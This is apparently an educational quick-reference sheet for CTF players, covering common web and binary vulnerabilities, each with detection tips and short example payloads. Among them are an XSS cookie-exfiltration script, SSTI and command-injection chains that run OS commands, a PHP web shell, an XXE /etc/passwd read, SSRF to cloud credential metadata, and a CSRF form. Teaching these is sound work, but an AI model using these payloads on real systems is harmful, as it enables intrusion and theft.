# Common Vulnerabilities — Quick Reference

> **AUTHORIZED / EDUCATIONAL USE ONLY.** Everything here is for learning, CTF practice, and
> testing systems you **own or have explicit written permission to test** (e.g., picoCTF,
> Hack The Box, TryHackMe, your own lab VMs). Attacking systems without authorization is
> illegal under laws such as the US Computer Fraud and Abuse Act (CFAA). The payloads below
> are deliberately simple, classroom-style examples.

---

## How to read this sheet

Each entry follows the same structure so you can scan fast:

- **What it is** — one-sentence definition.
- **Detect** — how to spot it quickly.
- **Example** — a representative payload / exploitation step.
- **In CTFs** — how it usually shows up.

Categories: web-app bugs first, then binary/memory bugs, then CSRF.

---

## SQL Injection (SQLi)

- **What it is:** Untrusted input is concatenated into a SQL query, letting you alter the query's logic.
- **Detect:** Inject a single quote `'` and watch for SQL errors or changed behavior; test `' OR '1'='1`. Compare responses for `' AND 1=1` vs `' AND 1=2`.
- **Example:**
  - Login bypass: username `admin' -- ` (password ignored).
  - Data extraction: `' UNION SELECT username, password FROM users -- `
- **In CTFs:** Login forms you bypass with `' OR 1=1 -- `, or extracting a flag from a hidden table via UNION/blind SQLi. `sqlmap` automates the tedious cases.

---

## Cross-Site Scripting (XSS)

- **What it is:** The app reflects/stores attacker-controlled input as HTML/JS that runs in a victim's browser.
- **Detect:** Submit a marker like `<i>test</i>` or `"><img src=x>`; view source to see if it renders unescaped. Check reflected params, comments, search boxes, profile fields.
- **Example:** `<script>alert(document.domain)</script>` or cookie theft: `<script>new Image().src='//me/?c='+document.cookie</script>`
- **In CTFs:** "Report to admin" challenges where an admin bot visits your payload and you steal its cookie/flag. Three types: reflected, stored, DOM-based.

---

## Server-Side Template Injection (SSTI)

- **What it is:** User input is embedded into a server-side template and evaluated as template code (often → RCE).
- **Detect:** Inject `${7*7}` / `{{7*7}}` / `#{7*7}` — if the response shows `49`, the template engine evaluated it. Identify the engine to pick the right RCE syntax.
- **Example (Jinja2 / Python Flask):**
  - `{{7*7}}` → confirms; then `{{ ''.__class__.__mro__[1].__subclasses__() }}` → eventually `{{ config.__class__... }}` or `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- **In CTFs:** A "greeting"/"name" feature that echoes your input; `{{7*7}}` returning `49` is the giveaway, then escalate to read `flag.txt` via `os.popen`.

---

## Local / Remote File Inclusion (LFI / RFI)

- **What it is:** The app includes a file whose path you control. LFI = local files; RFI = remote URL inclusion.
- **Detect:** Parameters like `?page=`, `?file=`, `?lang=`. Try `?page=../../../../etc/passwd`. For RFI, try `?page=http://yourhost/shell.txt`.
- **Example:**
  - LFI: `?file=../../../../etc/passwd`
  - PHP wrapper: `?file=php://filter/convert.base64-encode/resource=index.php` (read source).
  - LFI → RCE: poison `/var/log/apache2/access.log` with PHP in the User-Agent, then include the log.
- **In CTFs:** Read `flag.txt`, `/etc/passwd`, or the app's own source. RFI is rarer now (remote includes are usually disabled).

---

## Command Injection

- **What it is:** User input is passed to a system shell, letting you append your own OS commands.
- **Detect:** Any feature that "runs" something (ping, nslookup, convert, ZIP). Append `; id`, `| id`, `$(id)`, `` `id` ``, or `& whoami`.
- **Example:** Input `127.0.0.1; cat flag.txt` into a "ping a host" box. Blind variant: `; sleep 5` and watch the delay, then exfiltrate.
- **In CTFs:** "Network tools" pages (ping/traceroute/DNS lookup) where you chain commands to `cat flag.txt`. Filter bypasses: `cat fl''ag.txt`, `${IFS}` for spaces.

---

## XML External Entity (XXE)

- **What it is:** An XML parser processes attacker-defined external entities, enabling local file reads or SSRF.
- **Detect:** App accepts XML (SOAP, file uploads, API bodies). Inject a custom `<!DOCTYPE>` with an external entity.
- **Example:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```
- **In CTFs:** Endpoints that parse uploaded/posted XML; you read `flag.txt`/`/etc/passwd`, or pivot to SSRF (`http://...`) for internal endpoints.

---

## Server-Side Request Forgery (SSRF)

- **What it is:** You make the server send a request to a URL you choose — often to reach internal-only services.
- **Detect:** Parameters that fetch URLs (`?url=`, `?image=`, webhook fields, PDF/preview generators). Point them at a server you control to confirm callbacks.
- **Example:** `?url=http://127.0.0.1:8080/admin` or cloud metadata: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **In CTFs:** "Fetch this URL"/website-screenshot tools where you reach `localhost`, an internal admin panel, or cloud metadata to steal credentials.

---

## Insecure Direct Object Reference (IDOR)

- **What it is:** The app exposes a direct reference (an ID) to an object without checking you're authorized to access it.
- **Detect:** Look for numeric/predictable IDs in URLs, params, cookies, or JSON (`/account?id=1001`, `/invoice/55.pdf`). Increment/decrement/swap them.
- **Example:** Change `GET /api/user/1002/profile` to `1001` to read another user's data; change `?order_id=31337` to find a privileged record.
- **In CTFs:** Change `?id=1` to `?id=2` (or `0`/admin's id) to read the flag belonging to another user. Often combined with weak/no auth.

---

## Insecure Deserialization

- **What it is:** The app deserializes attacker-controlled data, letting you instantiate objects / trigger code (gadget chains).
- **Detect:** Serialized blobs in cookies/params: PHP (`O:4:"User"...`), Java (base64 starting `rO0AB`), Python pickle, .NET. Tampering changes behavior.
- **Example:**
  - PHP object injection: craft `O:4:"User":1:{s:5:"admin";b:1;}` to flip a property.
  - Java/Python: use known gadget chains (ysoserial for Java) to achieve RCE.
- **In CTFs:** A cookie or token that is a serialized object; you tamper a field (e.g., `isAdmin`) or trigger a `__wakeup`/`__destruct` gadget to RCE.

---

## JWT Attacks

- **What it is:** Flaws in how JSON Web Tokens are signed/verified let you forge or alter tokens.
- **Detect:** Token = three base64url parts (`header.payload.signature`). Decode the header/payload (jwt.io / CyberChef). Check `alg`.
- **Example:**
  - `alg: none` — strip the signature and set `"alg":"none"` if the server accepts it.
  - Weak HMAC secret — crack with `hashcat`/`jwt_tool`, then re-sign with `admin:true`.
  - Key confusion (RS256 → HS256) — sign with the public key as the HMAC secret.
- **In CTFs:** Decode the JWT, flip `"role":"user"` to `"admin"`, and either exploit `alg:none` or crack a weak secret to re-sign. **jwt_tool** automates all of these.

---

## Authentication Bypass

- **What it is:** Logic, default, or design flaws that let you authenticate without valid credentials.
- **Detect:** Try default creds (`admin:admin`), look for SQLi in login, parameter pollution, response/role tampering, password-reset logic flaws, and forced browsing to post-login pages.
- **Example:**
  - SQLi: username `admin'-- `.
  - Logic: register `admin ` (trailing space) or change `role=user` to `role=admin` in the request.
  - Skip login: directly request `/dashboard` if access control is missing.
- **In CTFs:** Default creds, SQLi login bypass, or a hidden/forced-browsing admin page. Always try the obvious credentials first.

---

## File Upload Vulnerabilities

- **What it is:** The app accepts uploads without proper validation, letting you upload executable content (web shell).
- **Detect:** Upload forms. Test extension filters (`.php`, `.phtml`, `.php5`), content-type spoofing, double extensions (`shell.php.jpg`), and magic-byte tricks.
- **Example:** Upload `shell.php` containing `<?php system($_GET['c']); ?>`, then browse `uploads/shell.php?c=cat+flag.txt`. Bypass filters with `.phtml` or a fake `GIF89a` header.
- **In CTFs:** "Upload an avatar/image" features where you sneak a PHP web shell past a weak filter, then execute commands to read the flag.

---

## Path Traversal (Directory Traversal)

- **What it is:** `../` sequences in a file path let you escape the intended directory and read arbitrary files.
- **Detect:** Any file/download/image param. Try `../../../../etc/passwd`, URL-encoded `%2e%2e%2f`, double-encoded, or null-byte/`....//` bypasses.
- **Example:** `GET /download?file=../../../../etc/passwd`. Bypass naive filters: `....//....//etc/passwd` or `..%252f..%252f`.
- **In CTFs:** Download/view endpoints where you walk up to read `flag.txt` or config files. Closely related to LFI (LFI = include + execute; traversal = just read).

---

## Buffer Overflow (Stack)

- **What it is:** Writing more data than a buffer holds overwrites adjacent memory — classically the saved return address — hijacking control flow.
- **Detect:** Unsafe input funcs (`gets`, `strcpy`, `scanf("%s")`) in the binary. Send a long cyclic pattern and check for a crash/EIP-RIP overwrite. `checksec` to see mitigations.
- **Example:** Send `"A"*offset + p64(win_addr)` so the function returns into `win()`. Find the offset with a cyclic pattern (pwntools `cyclic`).
- **In CTFs:** "ret2win" — overflow into a function that prints the flag; or leak libc then ret2libc to `system("/bin/sh")`. Use **pwntools**.

---

## Format String

- **What it is:** User input used directly as a format string (`printf(user_input)`) lets you read and write memory via format specifiers.
- **Detect:** Output that echoes your input verbatim. Send `%p %p %p %p` — if you see stack values/addresses leaked, it's vulnerable.
- **Example:**
  - Leak: `%p.%p.%p` (or `%7$p` to target a slot) to dump the stack, leak a canary or libc address.
  - Write: `%n` writes the number of bytes printed to a pointed-at address (overwrite a GOT entry / return value).
- **In CTFs:** Leak a stack canary or libc base to defeat ASLR, then combine with a buffer overflow; or `%n` to overwrite a variable controlling the win condition.

---

## Use-After-Free (UAF)

- **What it is:** Memory is used after being freed; reallocating that chunk with attacker data corrupts program state (a heap bug).
- **Detect:** Menu-driven heap programs (create/edit/delete/view objects) where a freed pointer isn't nulled ("dangling pointer"). View-after-free leaks data; edit-after-free corrupts it.
- **Example:** Free object A, allocate B of the same size so it reuses A's chunk, then use the dangling A pointer to read/overwrite B (e.g., overwrite a function pointer → control flow).
- **In CTFs:** Classic heap "notes/menu" pwn — exploit tcache/fastbin reuse to leak a pointer or hijack a function pointer/`__free_hook`. Advanced; do after stack pwn.

---

## Race Conditions (TOCTOU)

- **What it is:** A gap between checking a condition and using it (time-of-check to time-of-use) lets concurrent requests slip through.
- **Detect:** Operations that check-then-act on shared state: balance checks, one-time coupons, file create/use, "use once" tokens. Look for non-atomic flows.
- **Example:** Fire many parallel requests to redeem a $10 coupon simultaneously so several pass the "not used yet" check before any marks it used (double-spend). Burp Repeater's "send group in parallel" / Turbo Intruder.
- **In CTFs:** Redeem a limited item/coupon more times than allowed, or win a TOCTOU file race (symlink swap) to read a privileged file.

---

## Cross-Site Request Forgery (CSRF)

- **What it is:** A malicious site makes a victim's authenticated browser perform an unwanted state-changing action.
- **Detect:** State-changing requests (change email/password, transfer) that rely only on cookies and lack an unpredictable anti-CSRF token (or don't validate it / accept it cross-site).
- **Example:** Host a page that auto-submits a hidden form to `POST /change-email` with `email=attacker@evil.com`; when the logged-in victim opens it, their session performs the change.
- **In CTFs:** Combined with an admin-bot: craft a CSRF page that makes the admin change a setting or trigger an action that exposes the flag. Often paired with XSS.

---

## Fast triage checklist (web)

1. View page source + JS files + `robots.txt` + comments.
2. Note every input and parameter; test `'`, `<i>x</i>`, `{{7*7}}`, `../`, `; id` in each.
3. Inspect cookies/tokens (JWT? serialized blob? `admin=false`?).
4. Look for IDs to increment (IDOR) and URL-fetch / file params (SSRF / LFI / traversal).
5. Try default creds before anything fancy.

## Fast triage checklist (binary)

1. `file`, `strings`, `checksec` on the binary.
2. Find unsafe input functions (`gets`, `printf(user)`, menu/heap ops).
3. Map a crash with a cyclic pattern; find the offset.
4. Decide: ret2win → ret2libc → ROP, or format-string leak/write, or heap.

> See `../roadmap/learning-roadmap.md` for where to *practice* each of these, and
> `../roadmap/resources-and-platforms.md` for payload references (PayloadsAllTheThings, HackTricks).
